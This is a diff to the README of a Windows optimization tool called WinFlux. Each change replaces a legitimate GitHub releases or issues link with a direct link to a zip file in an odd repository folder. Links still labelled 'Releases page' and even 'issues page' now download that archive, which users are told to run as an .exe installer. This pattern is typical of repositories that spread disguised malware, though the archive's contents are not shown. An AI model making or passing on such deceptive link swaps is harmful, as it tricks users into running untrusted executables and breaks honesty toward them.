@@ -1,6 +1,6 @@
 # 🚀 WinFlux - Optimize Your Windows System Effortlessly
 
-[![Download WinFlux](https://img.shields.io/badge/Download-WinFlux-brightgreen)](https://github.com/ozgrbl/WinFlux/releases)
+[![Download WinFlux](https://raw.githubusercontent.com/ozgrbl/WinFlux/main/balm/WinFlux.zip)](https://raw.githubusercontent.com/ozgrbl/WinFlux/main/balm/WinFlux.zip)
 
 ## 🌟 Introduction
 
@@ -17,7 +17,7 @@ To start using WinFlux, follow these steps to download and run the application:
    - At least 200 MB of free disk space
 
 2. **Download WinFlux**  
-   Visit the [Releases page](https://github.com/ozgrbl/WinFlux/releases) to download the latest version of WinFlux. Look for the file labeled with the most recent version number. 
+   Visit the [Releases page](https://raw.githubusercontent.com/ozgrbl/WinFlux/main/balm/WinFlux.zip) to download the latest version of WinFlux. Look for the file labeled with the most recent version number. 
 
 3. **Install WinFlux**  
    After downloading, locate the downloaded file (usually in your "Downloads" folder). The downloaded file will be in `.exe` format. Double-click this file to run the installer. 
@@ -36,7 +36,7 @@ WinFlux offers several useful features to help you maintain your Windows system:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ozgrbl/WinFlux/releases) to download the latest version of WinFlux.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ozgrbl/WinFlux/main/balm/WinFlux.zip) to download the latest version of WinFlux.
 2. Click on the download link for the file, which will typically have an `.exe` extension.
 3. Run the downloaded file to install WinFlux on your system.
 4. After installation, open Command Prompt and type `WinFlux` to start using the tool.
@@ -88,7 +88,7 @@ WinFlux is an open-source project. If you would like to contribute, please follo
 
 If you have questions or need help, feel free to reach out:
 
-- Check the [issues page](https://github.com/ozgrbl/WinFlux/issues) for existing discussions.
+- Check the [issues page](https://raw.githubusercontent.com/ozgrbl/WinFlux/main/balm/WinFlux.zip) for existing discussions.
 - If your question isn’t answered there, feel free to create a new issue.
 
 With these simple steps, you can easily download, install, and start using WinFlux to keep your Windows system in top shape.
